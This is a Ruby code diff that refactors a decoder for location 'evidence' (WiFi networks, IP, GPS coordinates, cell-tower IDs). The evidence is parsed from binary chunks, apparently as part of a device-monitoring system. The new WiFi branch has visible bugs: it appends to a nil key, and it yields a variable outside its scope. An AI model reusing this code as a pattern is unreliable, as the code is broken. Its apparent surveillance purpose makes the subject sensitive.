@@ -70,10 +70,8 @@ module LocationEvidence
     @info[:loc_type] = type
   end
 
-  def decode_content
-    stream = StringIO.new @info[:chunks].join
-
-    evidences = Array.new
+  def decode_content(chunks, common_info)
+    stream = StringIO.new chunks.join
 
     case @info[:loc_type]
       when LOCATION_WIFI
@@ -96,57 +94,61 @@ module LocationEvidence
                                mac[4].unpack('C').first,
                                mac[5].unpack('C').first]
 
-          @info[:data][:wifi] << {:mac => mac_s, :sig => sig, :bssid => ssid}
+          info = Hash[common_info]
+          info[:data] = Hash.new
+          info[:data][:wifi] << {:mac => mac_s, :sig => sig, :bssid => ssid}
         end
-        evidences << self.clone
+        yield info if block_given?
 
       when LOCATION_IP
-        @info[:data][:type] = 'IPv4'
+        info = Hash[common_info]
+        info[:data] = Hash.new
+        info[:data][:type] = 'IPv4'
         ip = stream.read_ascii_string
-        @info[:data][:ip] = ip unless ip.nil?
-        evidences << self.clone
+        info[:data][:ip] = ip unless ip.nil?
+        yield info if block_given?
 
       when LOCATION_GPS
-        @info[:data][:type] = 'GPS'
         until stream.eof?
+          info = Hash[common_info]
+          info[:data] = Hash.new
+          info[:data][:type] = 'GPS'
           type, size, version = stream.read(12).unpack('L*')
-          @info[:acquired] = Time.from_filetime(*stream.read(8).unpack('L*'))
+          info[:acquired] = Time.from_filetime(*stream.read(8).unpack('L*'))
           gps = GPS_Position.new
           gps.read stream
-          @info[:data][:latitude] = "%.7f" % gps.latitude
-          @info[:data][:longitude] = "%.7f" % gps.longitude
+          info[:data][:latitude] = "%.7f" % gps.latitude
+          info[:data][:longitude] = "%.7f" % gps.longitude
           delim = stream.read(4).unpack('L').first
           raise EvidenceDeserializeError.new("Malformed LOCATION GPS (missing delimiter)") unless delim == ELEM_DELIMITER
 
-          # this is not the real clone! redefined clone ...
-          evidences << self.clone
+          yield info if block_given?
         end
       when LOCATION_GSM, LOCATION_CDMA
-        @info[:data][:type] = (@info[:loc_type] == LOCATION_GSM) ? 'GSM' : 'CDMA'
         until stream.eof?
+          info = Hash[common_info]
+          info[:data] = Hash.new
+          info[:data][:type] = (info[:loc_type] == LOCATION_GSM) ? 'GSM' : 'CDMA'
           type, size, version = stream.read(12).unpack('L*')
-          @info[:acquired] = Time.from_filetime(*stream.read(8).unpack('L*'))
+          info[:acquired] = Time.from_filetime(*stream.read(8).unpack('L*'))
           cell = CELL_Position.new
           cell.read stream
 
-          if @info[:loc_type] == LOCATION_GSM then
-            @info[:data][:cell] = {:mcc => cell.mcc, :mnc => cell.mnc, :lac => cell.lac, :cid => cell.cid, :db => cell.db, :adv => cell.adv, :age => 0}
+          if info[:loc_type] == LOCATION_GSM then
+            info[:data][:cell] = {:mcc => cell.mcc, :mnc => cell.mnc, :lac => cell.lac, :cid => cell.cid, :db => cell.db, :adv => cell.adv, :age => 0}
           else
-            @info[:data][:cell] = {:mcc => cell.mcc, :sid => cell.mnc, :nid => cell.lac, :bid => cell.cid, :db => cell.db, :adv => cell.adv, :age => 0}
+            info[:data][:cell] = {:mcc => cell.mcc, :sid => cell.mnc, :nid => cell.lac, :bid => cell.cid, :db => cell.db, :adv => cell.adv, :age => 0}
           end
 
           delim = stream.read(4).unpack('L').first
           raise EvidenceDeserializeError.new("Malformed LOCATION CELL (missing delimiter)") unless delim == ELEM_DELIMITER
 
-          # this is not the real clone! redefined clone ...
-          evidences << self.clone
+          yield info if block_given?
         end
 
       else
         raise EvidenceDeserializeError.new("Unsupported LOCATION type")
     end
-
-    return evidences
   end
 end
 
